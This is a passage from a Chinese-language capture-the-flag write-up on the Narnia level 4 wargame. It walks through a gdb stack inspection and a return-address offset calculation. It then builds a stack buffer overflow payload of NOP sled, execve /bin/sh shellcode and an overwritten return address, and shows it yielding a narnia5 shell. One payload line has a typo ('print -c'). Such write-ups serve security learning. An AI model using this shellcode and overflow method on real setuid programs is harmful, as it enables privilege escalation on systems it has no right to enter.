0xffffd570: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd580: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd590: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd5a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd5b0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd5c0: 0x41414141  0x41414141  0x41414141  0x00000000
0xffffd5d0: 0x08048500  0x00000000  0x00000000  0xf7e404b3
0xffffd5e0: 0x00000002  0xffffd674  0xffffd680  0xf7fcf000
0xffffd5f0: 0x00000000  0xffffd61c  0xffffd680  0x00000000
0xffffd600: 0x0804824c  0xf7fcaff4
```

看一下框架的信息会给我们返回地址,从中我们可以找到堆栈的大小:

```sh
(gdb) i f
Stack level 0, frame at 0xffffd5e0:
 eip = 0x80484fa in main; saved eip 0xf7e404b3
 Arglist at 0xffffd5d8, args:
 Locals at 0xffffd5d8, Previous frame's sp is 0xffffd5e0
 Saved registers:
  ebp at 0xffffd5d8, edi at 0xffffd5d4, eip at 0xffffd5dc
(gdb) p 0xffffd5dc-0xffffd4cc
$1 = 272
```



### Step 4: 编写和应用开发

我们知道堆栈的大小是272字节，而返回地址是**0xffffd5dc**.如果我们添加返回地址，它的值是276.

现在我们可以自由选择放置我们的shell代码了.比如说,我们把它放在中间的某个地方,例如,在134的位置.在内存中,我们得到: ```0xffffd5cc - 134 = 0xffffd546```.

因为276-134等于142, 如果我们将返回地址指向**0xffffd546**,它会到达堆栈的第142位并执行那里的任何东西. 我们要确保返回地址总是以shell代码的地址结束因为这个原因我们用NOPs填充地址.


我们将从之前的级别借用shell代码，它的大小是25字节:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80
```

考虑上面的值，我们可以编写下面的开发:

```
`python -c "print '\x90'*142 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' + 'A'*105 + '\x46\xd5\xff\xff'"`
```

我们可以用另一个地址来制作另一个版本的开发. 然后我们只需要调整我们的NOPs和我们的挂线. 例如, ```0xffffd5cc - 120 = 0xffffd554```:

```
`print -c "'\x90'*156 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' + 'A'*91 + '\x54\xd5\xff\xff'" `
```

都可以运行.

我们最终应用了我们的开发:
```
narnia4@melinda:/tmp$ python -c "print '\x90'*156 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' + 'A'*91 + '\x54\xd5\xff\xff'"
������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��P���
              AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT���
narnia4@melinda:/tmp$ /narnia/narnia4 `python -c "print '\x90'*156 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' + 'A'*91 + '\x54\xd5\xff\xff'"`
$ whoami
narnia5
```



----------

好了，我们已经完成了纳尼亚的一半挑战。很快我就会发布另一篇文章讲述另一半故事.
